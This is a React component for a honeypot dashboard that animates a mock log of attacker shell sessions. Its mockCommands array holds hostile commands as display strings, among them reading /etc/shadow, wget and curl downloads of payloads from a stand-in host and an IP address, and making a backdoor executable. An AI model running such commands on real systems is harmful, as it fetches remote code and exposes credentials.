import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Terminal, Activity, Copy, Check } from 'lucide-react';
import { Button } from './ui/button';

interface LogEntry {
  id: string;
  timestamp: string;
  ip: string;
  user: string;
  command: string;
  type: 'command' | 'response' | 'system';
}

const mockCommands = [
  { user: 'root', command: 'whoami', type: 'command' as const },
  { user: 'system', command: 'root', type: 'response' as const },
  { user: 'root', command: 'ls -la /etc/passwd', type: 'command' as const },
  { user: 'system', command: '-rw-r--r-- 1 root root 2847 Oct 10 2025 /etc/passwd', type: 'response' as const },
  { user: 'root', command: 'cat /etc/shadow', type: 'command' as const },
  { user: 'system', command: 'Permission denied', type: 'response' as const },
  { user: 'root', command: 'uname -a', type: 'command' as const },
  { user: 'system', command: 'Linux honeypot 5.15.0-58-generic #64-Ubuntu SMP x86_64 GNU/Linux', type: 'response' as const },
  { user: 'admin', command: 'wget http://malicious-site.com/payload.sh', type: 'command' as const },
  { user: 'system', command: 'Connection blocked by firewall', type: 'system' as const },
  { user: 'root', command: 'curl -o /tmp/exploit http://185.220.101.42/exploit.bin', type: 'command' as const },
  { user: 'system', command: 'Download blocked - suspicious activity logged', type: 'system' as const },
  { user: 'admin', command: 'chmod +x /tmp/backdoor', type: 'command' as const },
  { user: 'system', command: 'File not found', type: 'response' as const },
];

const attackerIPs = [
  '185.220.101.42',
  '103.75.189.34',
  '45.142.212.61',
  '198.98.57.207',
  '162.142.125.33',
];

export function CommandLog() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [copied, setCopied] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Add initial logs
    const initialLogs = mockCommands.slice(0, 4).map((cmd, index) => ({
      id: `log-${Date.now()}-${index}`,
      timestamp: new Date(Date.now() - (4 - index) * 2000).toLocaleTimeString(),
      ip: attackerIPs[Math.floor(Math.random() * attackerIPs.length)],
      ...cmd,
    }));
    setLogs(initialLogs);

    // Add new commands periodically
    let commandIndex = 4;
    const interval = setInterval(() => {
      if (commandIndex < mockCommands.length) {
        const cmd = mockCommands[commandIndex];
        const newLog: LogEntry = {
          id: `log-${Date.now()}`,
          timestamp: new Date().toLocaleTimeString(),
          ip: attackerIPs[Math.floor(Math.random() * attackerIPs.length)],
          ...cmd,
        };
        
        setLogs(prev => [...prev, newLog].slice(-30)); // Keep last 30 entries
        commandIndex = (commandIndex + 1) % mockCommands.length;
      }
    }, Math.random() * 3000 + 2000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    // Auto-scroll to bottom
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [logs]);

  const handleCopy = () => {
    const logText = logs.map(log => 
      `[${log.timestamp}] ${log.ip} ${log.user}@honeypot:~$ ${log.command}`
    ).join('\n');
    
    // Fallback method for environments where Clipboard API is blocked
    try {
      // Try modern Clipboard API first
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(logText).then(() => {
          setCopied(true);
          setTimeout(() => setCopied(false), 2000);
        }).catch(() => {
          // Fallback to textarea method
          copyToClipboardFallback(logText);
        });
      } else {
        // Use fallback method
        copyToClipboardFallback(logText);
      }
    } catch (err) {
      copyToClipboardFallback(logText);
    }
  };

  const copyToClipboardFallback = (text: string) => {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.top = '0';
    textarea.style.left = '0';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    
    try {
      document.execCommand('copy');
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
    
    document.body.removeChild(textarea);
  };

  return (
    <div className="bg-card border border-border rounded-lg h-full flex flex-col overflow-hidden">
      {/* Header */}
      <div className="border-b border-border p-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Terminal className="w-5 h-5 text-primary" />
          <h3 className="font-mono">Command Interception Log</h3>
        </div>
        <div className="flex items-center gap-2">
          <Button
            variant="ghost"
            size="sm"
            onClick={handleCopy}
            className="h-8 px-2"
          >
            {copied ? (
              <Check className="w-4 h-4 text-primary" />
            ) : (
              <Copy className="w-4 h-4" />
            )}
          </Button>
          <Activity className="w-4 h-4 text-primary animate-pulse" />
        </div>
      </div>

      {/* Terminal content */}
      <div 
        ref={scrollRef}
        className="flex-1 overflow-y-auto p-4 bg-[#0a0a0f] font-mono text-sm"
        style={{
          backgroundImage: `
            linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px)
          `,
          backgroundSize: '20px 20px',
        }}
      >
        <AnimatePresence initial={false}>
          {logs.map((log) => (
            <motion.div
              key={log.id}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.2 }}
              className="mb-2"
            >
              {log.type === 'command' && (
                <div className="flex items-start gap-2">
                  <span className="text-muted-foreground">[{log.timestamp}]</span>
                  <span className="text-primary">{log.ip}</span>
                  <span className="text-[#ff0055]">{log.user}@honeypot</span>
                  <span className="text-muted-foreground">:~$</span>
                  <span className="text-foreground">{log.command}</span>
                </div>
              )}
              {log.type === 'response' && (
                <div className="pl-4 text-[#00ff88]">
                  {log.command}
                </div>
              )}
              {log.type === 'system' && (
                <div className="flex items-start gap-2">
                  <span className="text-muted-foreground">[{log.timestamp}]</span>
                  <span className="text-[#ffbb00]">[SYSTEM]</span>
                  <span className="text-[#ffbb00]">{log.command}</span>
                </div>
              )}
            </motion.div>
          ))}
        </AnimatePresence>
        
        {/* Cursor blink */}
        <motion.div
          className="inline-block w-2 h-4 bg-primary ml-1"
          animate={{ opacity: [1, 0] }}
          transition={{ duration: 0.8, repeat: Infinity }}
        />
      </div>
    </div>
  );
}
